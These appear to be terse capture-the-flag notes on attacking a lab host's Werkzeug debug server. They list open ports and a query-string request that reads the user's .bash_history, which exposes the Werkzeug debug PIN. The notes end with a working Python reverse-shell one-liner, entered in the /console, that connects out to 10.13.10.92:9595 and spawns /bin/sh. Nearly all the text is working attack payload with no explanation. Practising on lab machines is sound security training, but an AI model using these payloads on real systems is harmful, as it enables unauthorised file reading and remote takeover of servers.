# Ports
22      SSH
890     HTTP
5000    Werkzeug *VULNERABLE*
# API
http://10.10.67.175:5000/api/v1/resources/books 

# Payload
http://10.10.67.175:5000/api/v1/resources/books?show=.bash_history
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit

# Reverse in "/console"
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.10.92",9595));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);